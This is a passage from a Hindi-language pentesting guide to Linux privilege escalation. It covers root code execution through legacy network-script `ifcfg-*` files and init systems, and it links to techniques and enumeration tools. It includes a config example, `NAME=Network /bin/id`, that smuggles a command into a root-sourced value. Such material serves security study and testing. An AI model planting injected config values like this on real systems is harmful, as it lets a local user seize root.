`ifcfg-*` file जाँच का संकेत तब है, जब कोई कम-privileged user उसे बना या बदल सकता हो **और** कोई privileged network-activation path उसी सटीक file को पढ़ेगा। प्रभावी file और directory permissions, चुने गए interface, installed `ifup`/`ifdown` implementation और उसे invoke करने वाले की पुष्टि करें। केवल writable file से execution नहीं होता। [Red Hat की RHEL 7 networking guide](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) legacy network scripts और NetworkManager में अंतर बताती है: NetworkManager स्वयं former को trigger नहीं करता। [RHEL 8 के दस्तावेज़](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) के अनुसार, उसका default `ifup`/`ifdown` NetworkManager का उपयोग करता है, जबकि optional legacy package shell scripts उपलब्ध कराता है।

ऐसे system पर जो वास्तव में privileged legacy scripts का उपयोग करता है, unquoted, shell-sourced `ifcfg-*` assignment—जैसे `NAME=`—code-execution boundary पार कर सकता है। सटीक parser, value और activation path की पुष्टि करें; filename या NetworkManager की मौजूदगी के आधार पर shell interpretation न मानें। ऐसा sudo-allowed wrapper, जो caller के input को `ifcfg-*` file में लिखता है और फिर legacy `ifup` call करता है, इस boundary तक पहुँचने का एक अलग रास्ता है—भले ही caller सीधे file को edit न कर सके।

उदाहरण के लिए: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_ध्यान दें कि Network और /bin/id के बीच खाली जगह है_)

### **init, init.d, systemd, और rc.d**

`/etc/init.d` डायरेक्टरी में System V init (SysVinit) के **scripts** होते हैं, जो **क्लासिक Linux service management system** है। इसमें services को `start`, `stop`, `restart`, और कभी-कभी `reload` करने के scripts शामिल होते हैं। इन्हें सीधे या `/etc/rc?.d/` में मौजूद symbolic links के ज़रिए चलाया जा सकता है। Redhat systems में एक वैकल्पिक path `/etc/rc.d/init.d` है।

दूसरी ओर, `/etc/init` का संबंध **Upstart** से है। यह Ubuntu द्वारा शुरू किया गया एक नया **service management** system है, जो service management के कामों के लिए configuration files का उपयोग करता है। Upstart पर जाने के बावजूद, इसकी compatibility layer के कारण SysVinit scripts का उपयोग Upstart configurations के साथ अब भी किया जाता है।

**systemd** एक आधुनिक initialization और service manager है, जिसमें on-demand daemon starting, automount management, और system state snapshots जैसी उन्नत सुविधाएँ हैं। यह distribution packages के लिए files को `/usr/lib/systemd/` में और administrator द्वारा किए गए बदलावों को `/etc/systemd/system/` में व्यवस्थित करता है, जिससे system administration की प्रक्रिया सरल होती है।<sup>[[21]](#references)</sup>

## अन्य तरकीबें

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### प्रतिबंधित Shells से बाहर निकलना


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../../network-services-pentesting/cisco-sd-wan-manager-local-privilege-escalation.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks आम तौर पर एक syscall को hook करते हैं, ताकि userspace manager को privileged kernel functionality उपलब्ध हो सके। Manager authentication कमज़ोर होने पर (उदाहरण के लिए, FD-order पर आधारित signature checks या कमज़ोर password schemes) कोई local app manager का रूप धरकर पहले से rooted devices पर root तक privilege escalation कर सकती है। इसके बारे में और exploitation की जानकारी यहाँ देखें:


{{#ref}}
../../../mobile-pentesting/android-app-pentesting/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Regex-based exec के ज़रिए VMware Tools service discovery LPE (CWE-426) (CVE-2025-41244)

VMware Tools/Aria Operations में regex-आधारित service discovery, process command lines से binary path निकालकर उसे privileged context में -v के साथ execute कर सकती है। ढीले patterns (उदाहरण के लिए, \S का उपयोग) writable locations में attacker द्वारा रखे गए listeners (उदाहरण के लिए, /tmp/httpd) से match हो सकते हैं, जिससे root के रूप में execution हो सकता है (CWE-426 Untrusted Search Path)।<sup>[[27]](#references)</sup>

इस बारे में और जानने तथा अन्य discovery/monitoring stacks पर लागू होने वाला सामान्यीकृत pattern देखने के लिए यहाँ जाएँ:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## और मदद

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc टूल्स

### **Linux local privilege escalation vectors खोजने के लिए सबसे अच्छा tool:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux और MAC में kernel vulns की enumeration करें [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**और scripts का संकलन**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)



## References

- [1] [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: cron द्वारा चलाए गए monitor के लिए forged .text_sig payload](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Linux में बुनियादी Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Linux Privilege Escalation गाइड](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [हमला और बचाव: 2016 की Linux Privilege Escalation तकनीकें](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [किसी को command execution की उम्मीद नहीं थी!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Linux Privilege Escalation)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Lab Exercises का walkthrough - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Linux Privilege Escalation के सुझाव और तरकीबें](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Linux Enumeration और Privilege Escalation tool](https://github.com/rtcrowley/linux-private-i)
- [14] [Socket क्या है?](https://www.linux.com/news/what-socket/)
- [15] [Peppo (Proving Grounds) writeup](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [D-BUS के बारे में जानें](https://www.linuxjournal.com/article/7744)
- [17] [SUID Executables Linux Privilege Escalation](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Part-2 – Linux Privilege Escalation](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Linux पर ACLs को manage कैसे करें](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [network-scripts के ज़रिए Redhat/CentOS पर root access](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [systemd क्या है?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (logs के ज़रिए bash arithmetic injection, पूरी chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – VMware जिसे नाम दें, उसे elevate करता है (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Sudo Chroot के ज़रिए Privilege Escalation](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – CVE-2025-32462 और CVE-2025-32463 Sudo elevation-of-privilege vulnerabilities](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [32] [Python importlib दस्तावेज़](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [@paragonsec का Tweet](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Linux पर Passwords की logging](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Logrotate Race Condition का विवरण](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Python 3.10 documentation – `site` और path configuration files](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
